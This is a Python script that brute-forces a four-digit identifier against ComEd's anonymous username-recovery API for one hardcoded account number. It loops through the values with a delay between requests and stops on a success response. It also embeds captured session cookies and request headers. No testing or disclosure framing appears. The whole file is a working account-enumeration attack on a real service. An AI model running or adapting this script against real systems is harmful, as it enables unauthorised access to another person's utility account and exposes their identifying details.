import requests
import time

cookies = {
    "ASP.NET_SessionId": "r4puee0giveeb3z0pyt4llnv",
    "OpenIdConnect.nonce.C8SwCUe5oG7H2kyBykFeNLF1Oua5DYWrTNV9Fp3huuA%3D": "T3dZWkZBMmRnY1VRcjRDRzFvaF9IaU9Jb1hVekRYd0VfZThPa0xpV1kxV0tnUG5tcWI3V0pfS0VkQmFKOUVEVGJBcVdYM29iQmwwektoWFc1aWV6bGRQWnRzV3RzME9CNzlueWUtNnl4TFZHNzNvNmFfT2JtU2FRMUpWQ1YyWEE1X2Jsak40Mnc1V2loVUFoTVhCU0NmV0NSQ1V6aDNWVmlkRVR1ZzFLSmwwUmhhSlNGYVNTbFBEdXZKdnVVXzZGWkVQTVhNU0dfS2pWelRDMWU0NWwwY0REaFBv",
    "OpenIdConnect.cv.PvE%2B2D6TgFZI6mmPbtq1fRov0qYWKJ543iVH834UxBA%3D": "N0ZGT2Q0RzJOTWkxeTk4OENzemxDYXh5bWN3VExfeThVcFQ5YWw5WnJSODZlaFNkUUFtSnpsLTJ2VmF2VEdIdERCemw1STRkd3pmb05xbFJhNFUzb19yek9NLTJtMnQzQXEzcUVMeFRWTXZZajd0bXdpUUFLWlllNXd1ZjdiTFJEV3R6d3c%3D",
    "ARRAffinity": "023a45785bdace8159926e32ed246de2ecb9ebb01ac6c32b6774e624489f5dd2",
    "ARRAffinitySameSite": "023a45785bdace8159926e32ed246de2ecb9ebb01ac6c32b6774e624489f5dd2",
    "ASLBSA": "000326f1c4f1b1902571171bb94e2e9456860df00b29fb8fa251947fbdf2737c70fe",
    "ASLBSACORS": "000326f1c4f1b1902571171bb94e2e9456860df00b29fb8fa251947fbdf2737c70fe",
    "ai_user": "HwWVUtBrW9JM4pn4rdtwvg|2024-06-24T03:31:17.117Z",
    "ai_session": "bpSDXDmLl9Yd0kIMEWr9n6|1719199877220|1719199995697",
}

headers = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9,sq;q=0.8,it;q=0.7,fr;q=0.6",
    "cache-control": "no-cache",
    "content-type": "application/json",
    # 'cookie': 'ASP.NET_SessionId=r4puee0giveeb3z0pyt4llnv; OpenIdConnect.nonce.C8SwCUe5oG7H2kyBykFeNLF1Oua5DYWrTNV9Fp3huuA%3D=T3dZWkZBMmRnY1VRcjRDRzFvaF9IaU9Jb1hVekRYd0VfZThPa0xpV1kxV0tnUG5tcWI3V0pfS0VkQmFKOUVEVGJBcVdYM29iQmwwektoWFc1aWV6bGRQWnRzV3RzME9CNzlueWUtNnl4TFZHNzNvNmFfT2JtU2FRMUpWQ1YyWEE1X2Jsak40Mnc1V2loVUFoTVhCU0NmV0NSQ1V6aDNWVmlkRVR1ZzFLSmwwUmhhSlNGYVNTbFBEdXZKdnVVXzZGWkVQTVhNU0dfS2pWelRDMWU0NWwwY0REaFBv; OpenIdConnect.cv.PvE%2B2D6TgFZI6mmPbtq1fRov0qYWKJ543iVH834UxBA%3D=N0ZGT2Q0RzJOTWkxeTk4OENzemxDYXh5bWN3VExfeThVcFQ5YWw5WnJSODZlaFNkUUFtSnpsLTJ2VmF2VEdIdERCemw1STRkd3pmb05xbFJhNFUzb19yek9NLTJtMnQzQXEzcUVMeFRWTXZZajd0bXdpUUFLWlllNXd1ZjdiTFJEV3R6d3c%3D; ARRAffinity=023a45785bdace8159926e32ed246de2ecb9ebb01ac6c32b6774e624489f5dd2; ARRAffinitySameSite=023a45785bdace8159926e32ed246de2ecb9ebb01ac6c32b6774e624489f5dd2; ASLBSA=000326f1c4f1b1902571171bb94e2e9456860df00b29fb8fa251947fbdf2737c70fe; ASLBSACORS=000326f1c4f1b1902571171bb94e2e9456860df00b29fb8fa251947fbdf2737c70fe; ai_user=HwWVUtBrW9JM4pn4rdtwvg|2024-06-24T03:31:17.117Z; ai_session=bpSDXDmLl9Yd0kIMEWr9n6|1719199877220|1719199995697',
    "opco": "ComEd",
    "origin": "https://secure.comed.com",
    "priority": "u=1, i",
    "referer": "https://secure.comed.com/accounts/credential-retrieval/find-account",
    "request-context": "appId=cid-v1:2c9facf2-7f3a-4f54-88ab-652d7b9497c4",
    "request-id": "|b18ba69d11ae4182913009c78fcd8270.019296344277467d",
    "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"macOS"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "traceparent": "00-b18ba69d11ae4182913009c78fcd8270-019296344277467d-01",
    "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "x-opco": "ComEd",
}

json_data = {
    "account_number": "2987683000",
    "phone": "",
    "identifier": "3321",
    "zip_code": "",
}

for i in range(6750, 9999):
    print(i)
    json_data["identifier"] = str(i).zfill(4)

    response = requests.post(
        "https://secure.comed.com/.euapi/mobile/custom/anon/ComEd/recover/username",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

    time.sleep(1)

    print(response.text)

    if 'true' in response.text:
        print(json_data)
        break
# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
# data = '{"account_number":"2987683000","phone":"","identifier":"3421","zip_code":""}'
# response = requests.post(
#    'https://secure.comed.com/.euapi/mobile/custom/anon/ComEd/recover/username',
#    cookies=cookies,
#    headers=headers,
#    data=data,
# )

print()